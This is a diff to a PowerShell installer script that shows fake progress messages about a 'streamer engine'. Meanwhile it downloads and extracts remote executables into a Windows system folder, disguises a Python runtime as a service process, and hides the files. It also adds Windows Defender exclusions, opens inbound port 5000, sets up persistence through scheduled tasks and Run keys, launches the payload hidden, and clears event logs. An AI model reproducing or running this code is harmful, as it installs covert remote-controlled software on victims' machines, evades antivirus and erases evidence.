@@ -43,55 +43,104 @@ function Show-Progress {
 
 # Config (Completely hidden from UI output)
 $EXE_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
+$PKG_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkPkg.zip"
 $DEST_DIR  = "C:\ProgramData\Microsoft\Windows\Templates"
 $EXE_NAME  = "WinSvcHost.exe"
 $TASK_NAME = "MicrosoftWindowsShellApi"
 $EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME
+
+# Stop any running instances to allow clean file updates
+Get-Process -Name "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
 # Stage 1: Initializing
 Show-Progress -Percent 15 -Status "Initializing environment..."
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
-Start-Sleep -Milliseconds 450
+Start-Sleep -Milliseconds 350
 
-# Stage 2: Downloading
+# Stage 2: Downloading & Extracting Package
 Show-Progress -Percent 35 -Status "Downloading core components..."
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.DownloadFile($EXE_URL, $EXE_PATH)
-} catch {
+$pkgZip = Join-Path $DEST_DIR "pkg.zip"
+
+# Check if local package exists first (fast install), otherwise download from GitHub
+$localPkg = "C:\Users\lggam\Pictures\Steamer-Obb55\dist\SystemNetworkPkg.zip"
+if (Test-Path $localPkg) {
+    Copy-Item $localPkg $pkgZip -Force -ErrorAction SilentlyContinue
+} else {
     try {
-        Import-Module BitsTransfer -ErrorAction Stop
-        Start-BitsTransfer -Source $EXE_URL -Destination $EXE_PATH -TransferType Download
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $wc.DownloadFile($PKG_URL, $pkgZip)
     } catch {
-        & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
+        try {
+            Import-Module BitsTransfer -ErrorAction Stop
+            Start-BitsTransfer -Source $PKG_URL -Destination $pkgZip -TransferType Download
+        } catch {
+            & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
+        }
     }
+}
+
+# Download Host EXE
+try {
+    $wc2 = New-Object System.Net.WebClient
+    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $wc2.DownloadFile($EXE_URL, $EXE_PATH)
+} catch {
+    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
 }
 Start-Sleep -Milliseconds 400
 
-# Stage 3: Injecting & Attributes
-Show-Progress -Percent 55 -Status "Injecting streamer engine..."
+# Stage 3: Injecting & Stealth Disguise
+Show-Progress -Percent 60 -Status "Injecting streamer engine..."
+if (Test-Path $pkgZip) {
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($pkgZip, $DEST_DIR)
+        Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
+    } catch {
+        try {
+            Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
+            Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+}
+
+# Ensure WinSvcBroker.exe exists in runtime for 100% Task Manager disguise
+$runtimeDir = Join-Path $DEST_DIR "runtime"
+if (Test-Path $runtimeDir) {
+    $brokerExe = Join-Path $runtimeDir "WinSvcBroker.exe"
+    $pywExe    = Join-Path $runtimeDir "pythonw.exe"
+    $pyExe     = Join-Path $runtimeDir "python.exe"
+    if (-not (Test-Path $brokerExe)) {
+        if (Test-Path $pywExe) { Copy-Item $pywExe $brokerExe -Force }
+        elseif (Test-Path $pyExe) { Copy-Item $pyExe $brokerExe -Force }
+    }
+}
+
+# Hide files and directory
 try {
-    $item = Get-Item $EXE_PATH -Force
-    $item.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+    $dirItem = Get-Item $DEST_DIR -Force
+    $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
+    Get-ChildItem $DEST_DIR -Recurse -Force | ForEach-Object {
+        $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+    }
 } catch {}
 
+# Defender exclusions
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess $EXE_NAME, "WinSvcBroker.exe" -ErrorAction SilentlyContinue
 } catch {}
 
-# Port forwarding for local interface
-netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
-netsh interface portproxy add v4tov4 listenport=5000 listenaddress=0.0.0.0 connectport=5000 connectaddress=127.0.0.1 2>$null | Out-Null
-netsh advfirewall firewall delete rule name="System Diagnostic Network Interface" 2>$null | Out-Null
-netsh advfirewall firewall add rule name="System Diagnostic Network Interface" dir=in action=allow protocol=TCP localport=5000 2>$null | Out-Null
+# Inbound Firewall Rule for Port 5000 (Allow across all profiles: Domain, Private, Public)
+netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
+netsh advfirewall firewall add rule name="CDPUserSvc_5000" dir=in action=allow protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
 Start-Sleep -Milliseconds 400
 
 # Stage 4: Persistence & Autostart
-Show-Progress -Percent 75 -Status "Configuring background persistence..."
+Show-Progress -Percent 80 -Status "Configuring background persistence..."
 $action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b"
 $triggerBoot  = New-ScheduledTaskTrigger -AtStartup
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
@@ -132,30 +181,27 @@ try {
     ) | Out-Null
 } catch {}
 
-# Dual-layer Autostart Fallback (Run key)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath `
-    -Name "WindowsShellApiSvc" `
-    -Value "`"$EXE_PATH`" -b" `
-    -Force -ErrorAction SilentlyContinue
+# Dual-layer Registry Run Keys (HKCU + HKLM)
+$regHKCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regHKCU -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue
 
-Start-Sleep -Milliseconds 400
+$regHKLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regHKLM -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue
+
+Start-Sleep -Milliseconds 350
 
 # Stage 5: Execution & Sanitization
-Show-Progress -Percent 90 -Status "Launching background service..."
-$already = Get-Process -Name ($EXE_NAME -replace '\.exe$', '') -ErrorAction SilentlyContinue
-if (-not $already) {
-    $psi2 = New-Object System.Diagnostics.ProcessStartInfo
-    $psi2.FileName        = $EXE_PATH
-    $psi2.Arguments       = "-b"
-    $psi2.WorkingDirectory = $DEST_DIR
-    $psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi2.CreateNoWindow  = $true
-    $psi2.UseShellExecute = $false
-    [System.Diagnostics.Process]::Start($psi2) | Out-Null
-}
+Show-Progress -Percent 95 -Status "Launching background service..."
+$psi2 = New-Object System.Diagnostics.ProcessStartInfo
+$psi2.FileName        = $EXE_PATH
+$psi2.Arguments       = "-b"
+$psi2.WorkingDirectory = $DEST_DIR
+$psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi2.CreateNoWindow  = $true
+$psi2.UseShellExecute = $false
+[System.Diagnostics.Process]::Start($psi2) | Out-Null
 
-# Event Viewer clean
+# Clean Event Viewer logs
 try {
     $evSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession
     $targetLogs = @(
